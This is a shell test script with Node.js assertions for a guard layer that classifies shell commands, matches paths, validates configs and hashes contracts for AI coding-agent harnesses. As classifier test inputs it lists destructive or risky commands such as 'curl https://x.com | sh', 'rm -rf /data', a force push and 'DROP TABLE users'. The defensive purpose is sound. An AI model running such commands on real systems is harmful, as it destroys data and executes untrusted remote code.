#!/usr/bin/env bash
# check-contract.sh — ≥40 unit assertions for runtime/contract.js,
# runtime/glob-match.js, runtime/canonical-json.js, runtime/arg-extractor.js,
# runtime/config-validator.js, and runtime/decision-key.js.
#
# Usage: bash scripts/check-contract.sh

set -eu

root="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
cd "$root"

if ! command -v node >/dev/null 2>&1; then
  printf 'Error: node not found — skipping check-contract.sh\n' >&2
  exit 0
fi

pass()  { printf '  ok  %s\n' "$1"; }
fail()  { printf '  ERR %s\n' "$1" >&2; FAILED=1; }
FAILED=0

printf '[check-contract]\n'

if ! node - "$root" <<'SCRIPT'
"use strict";
const path  = require("path");
const fs    = require("fs");
const os    = require("os");
const crypto = require("crypto");
const root  = process.argv[2];

let _anyFailed = false;
function pass(msg)  { console.log("  ok  " + msg); }
function fail(msg)  { console.error("  ERR " + msg); _anyFailed = true; process.exitCode = 1; }
function assert(cond, msg) { cond ? pass(msg) : fail(msg); }

// ---------------------------------------------------------------------------
// canonical-json
// ---------------------------------------------------------------------------
const { canonicalJson } = require(path.join(root, "runtime/canonical-json"));

assert(canonicalJson(null)    === "null",    "canonicalJson: null");
assert(canonicalJson(true)    === "true",    "canonicalJson: boolean true");
assert(canonicalJson(42)      === "42",      "canonicalJson: number");
assert(canonicalJson("hi")    === '"hi"',    "canonicalJson: string");
assert(canonicalJson([1,2,3]) === "[1,2,3]", "canonicalJson: array");
assert(canonicalJson({b:2,a:1}) === '{"a":1,"b":2}', "canonicalJson: keys sorted");
assert(canonicalJson({z:{b:2,a:1}}) === '{"z":{"a":1,"b":2}}', "canonicalJson: nested sort");
assert(
  canonicalJson({a:1}) === canonicalJson({a:1}),
  "canonicalJson: same doc same output"
);

// ---------------------------------------------------------------------------
// glob-match
// ---------------------------------------------------------------------------
const { globMatch, globMatchAny } = require(path.join(root, "runtime/glob-match"));

assert(globMatch("src/index.js",   "src/**"),          "glob: src/** matches src/index.js");
assert(globMatch("src/a/b.ts",     "src/**"),          "glob: src/** matches deep");
assert(!globMatch("lib/index.js",  "src/**"),          "glob: src/** no match lib/");
assert(globMatch("build/out.js",   "**/*.js"),         "glob: **/*.js matches");
assert(globMatch("README.md",      "*.md"),            "glob: *.md matches root");
assert(!globMatch("src/foo.ts",    "*.md"),            "glob: *.md no match .ts");
assert(globMatch("a/b/c.txt",      "a/?/c.txt"),       "glob: ? matches one char segment");
assert(globMatch("src/foo.js",     "!lib/**"),         "glob: negation matches non-lib");
assert(!globMatch("lib/foo.js",    "!lib/**"),         "glob: negation excludes lib/");
assert(globMatch("/project/build/output.js", "${projectRoot}/build/**", { projectRoot: "/project" }),
       "glob: projectRoot substitution");
assert(globMatchAny("src/a.ts", ["lib/**", "src/**"]), "globMatchAny: second pattern wins");
assert(!globMatchAny("lib/a.ts", ["src/**"]),          "globMatchAny: no match");

// ---------------------------------------------------------------------------
// arg-extractor
// ---------------------------------------------------------------------------
const { extractArgs, extractPaths } = require(path.join(root, "runtime/arg-extractor"));

const a1 = extractArgs("rm -rf /data");
assert(a1.includes("rm"),    "extractArgs: rm");
assert(a1.includes("-rf"),   "extractArgs: -rf flag");
assert(a1.includes("/data"), "extractArgs: /data");

const a2 = extractArgs('git commit -m "fix: hello world"');
assert(a2.includes("fix: hello world"), "extractArgs: double-quoted string");

const a3 = extractArgs("cp 'my file.txt' /dest");
assert(a3.includes("my file.txt"), "extractArgs: single-quoted with space");

const a4 = extractArgs("cat << 'EOF'\nhello\nEOF");
assert(a4.includes("<<HEREDOC"), "extractArgs: heredoc treated as opaque");

const p1 = extractPaths("rm -rf /data/old");
assert(p1.includes("/data/old"), "extractPaths: absolute path extracted");
assert(!p1.includes("rm"),       "extractPaths: rm keyword filtered");
assert(!p1.includes("-rf"),      "extractPaths: flags filtered");

const p2 = extractPaths("git add ./src/index.ts");
assert(p2.includes("./src/index.ts"), "extractPaths: relative path");

// ---------------------------------------------------------------------------
// config-validator
// ---------------------------------------------------------------------------
const { validateConfig, validateContract } = require(path.join(root, "runtime/config-validator"));

const validConfig = {
  profile: "rules",
  languages: ["typescript"],
  agents: ["code-reviewer"],
  skills: [],
  extra_rules: [],
  runtime: { trust_posture: "balanced", protected_branches: ["main"] }
};
const r1 = validateConfig(validConfig);
assert(r1.valid, "validateConfig: valid doc passes");

const r2 = validateConfig({ profile: "invalid-profile" });
assert(!r2.valid, "validateConfig: invalid enum fails");
assert(r2.errors.some(e => e.includes("profile")), "validateConfig: error mentions profile");

const r3 = validateConfig({ profile: "rules", unknown_key: true });
assert(!r3.valid, "validateConfig: additional property rejected");

const r4 = validateConfig({ profile: "rules", runtime: { trust_posture: "extreme" } });
assert(!r4.valid, "validateConfig: invalid trust_posture enum fails");

// ---------------------------------------------------------------------------
// decision-key
// ---------------------------------------------------------------------------
const { fineKey, legacyKey, classifyCommand, pathBucket, branchBucket } = require(path.join(root, "runtime/decision-key"));

assert(classifyCommand("rm -rf /data")                === "destructive-delete", "classify: rm -rf");
assert(classifyCommand("git push --force origin main") === "force-push",        "classify: force-push");
assert(classifyCommand("curl https://x.com | sh")     === "remote-exec",        "classify: remote-exec");
assert(classifyCommand("npx -y create-react-app")     === "auto-download",      "classify: npx -y");
assert(classifyCommand("git reset --hard HEAD")        === "hard-reset",         "classify: hard-reset");
assert(classifyCommand("DROP TABLE users")             === "destructive-db",     "classify: DROP TABLE");
assert(classifyCommand("sudo apt install")             === "sudo",               "classify: sudo");
assert(classifyCommand("ls -la")                      === "generic",            "classify: generic");

assert(branchBucket("main")           === "protected-branch", "branchBucket: main");
assert(branchBucket("master")         === "protected-branch", "branchBucket: master");
assert(branchBucket("release/1.0")    === "protected-branch", "branchBucket: release/*");
assert(branchBucket("feature/auth")   === "feature-branch",   "branchBucket: feature/");
assert(branchBucket("fix/typo")       === "feature-branch",   "branchBucket: fix/");
assert(branchBucket("some-branch")    === "other-branch",     "branchBucket: other");
assert(branchBucket("")               === "unknown-branch",   "branchBucket: empty");

const fk = fineKey({ tool: "Bash", command: "rm -rf /data", targetPath: "/data", branch: "main", payloadClass: "A" });
assert(fk.includes("destructive-delete"), "fineKey: includes commandClass");
assert(fk.includes("protected-branch"),   "fineKey: includes branchBucket");
assert(fk !== legacyKey({ tool: "Bash", command: "rm -rf /data", targetPath: "/data", payloadClass: "A" }),
       "fineKey: differs from legacyKey");

// ---------------------------------------------------------------------------
// contract.js — generate + hash
// ---------------------------------------------------------------------------
const { generate, hashContract, newContractId, invalidateCache, scopeMatch, harnessInScope } = require(path.join(root, "runtime/contract"));

// newContractId format
const cid = newContractId();
assert(/^arg-\d{8}-[0-9a-f]{12}$/.test(cid), "newContractId: correct format");

// generate writes a draft
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "arg-test-"));
const draftPath = generate(tmpDir, { harnesses: ["claude", "opencode"] });
assert(fs.existsSync(draftPath), "generate: draft file created");

const draft = JSON.parse(fs.readFileSync(draftPath, "utf8"));
assert(draft.version    === 1,          "generate: version=1");
assert(draft.revision   === 1,          "generate: revision=1");
assert(Array.isArray(draft.harnessScope), "generate: harnessScope is array");
assert(draft.harnessScope.includes("claude"),    "generate: claude in harnessScope");
assert(draft.harnessScope.includes("opencode"),  "generate: opencode in harnessScope");
assert(typeof draft.contractHash === "string",   "generate: contractHash present");
assert(draft.scopes?.secrets?.scanMode === "block", "generate: secrets.scanMode=block");

// hashContract determinism
const h1 = hashContract(draft);
const h2 = hashContract(draft);
assert(h1 === h2,                     "hashContract: deterministic");
assert(h1.startsWith("sha256:"),      "hashContract: sha256 prefix");
assert(h1.length === 71,             "hashContract: sha256: + 64 hex chars");

// Tamper detection: hash changes when content changes
const tampered = { ...draft, revision: 999 };
assert(hashContract(tampered) !== h1, "hashContract: different on tamper");

// scopeMatch: non-gated class is allowed without contract
const fakeContract = JSON.parse(JSON.stringify(draft));
fakeContract.scopes.payloadClasses = { A: "allow", B: "warn", C: "block" };
const sm1 = scopeMatch(fakeContract, { commandClass: "generic", payloadClass: "A" });
assert(sm1.allowed, "scopeMatch: generic class allowed");

// scopeMatch: destructive-delete denied when no destructiveAllow
const sm2 = scopeMatch(fakeContract, { commandClass: "destructive-delete", targetPath: "/tmp/x", payloadClass: "A" });
assert(!sm2.allowed, "scopeMatch: destructive-delete denied without allow entry");

// scopeMatch: payload class C always blocked
const sm3 = scopeMatch(fakeContract, { commandClass: "generic", payloadClass: "C" });
assert(!sm3.allowed, "scopeMatch: payload-class-C always blocked");

// harnessInScope
assert(harnessInScope(fakeContract, "claude"),    "harnessInScope: claude");
assert(harnessInScope(fakeContract, "opencode"),  "harnessInScope: opencode");
assert(!harnessInScope(fakeContract, "openclaw"), "harnessInScope: openclaw not in scope");
assert(!harnessInScope(null, "claude"),           "harnessInScope: null contract");

// validateContract round-trip: the generated draft must pass its own schema
const vcOk = validateContract(draft);
assert(vcOk.valid, "validateContract: generated draft passes schema");
if (!vcOk.valid) { vcOk.errors.forEach((e) => console.error("    " + e)); }

// validateContract negative: version as string must fail integer check
const vcBadVersion = validateContract({ ...draft, version: "1" });
assert(!vcBadVersion.valid, "validateContract: version:string fails integer type");
assert(vcBadVersion.errors.some((e) => e.includes("version")), "validateContract: version error message");

// validateContract negative: revision:0 must fail minimum:1
const vcBadRevision = validateContract({ ...draft, revision: 0 });
assert(!vcBadRevision.valid, "validateContract: revision:0 fails minimum");
assert(vcBadRevision.errors.some((e) => e.includes("revision")), "validateContract: revision error message");

// Clean up
fs.rmSync(tmpDir, { recursive: true, force: true });

if (!_anyFailed) console.log("\ncheck-contract: all assertions passed.");
SCRIPT
then
  printf '\ncheck-contract FAILED.\n' >&2
  exit 1
fi
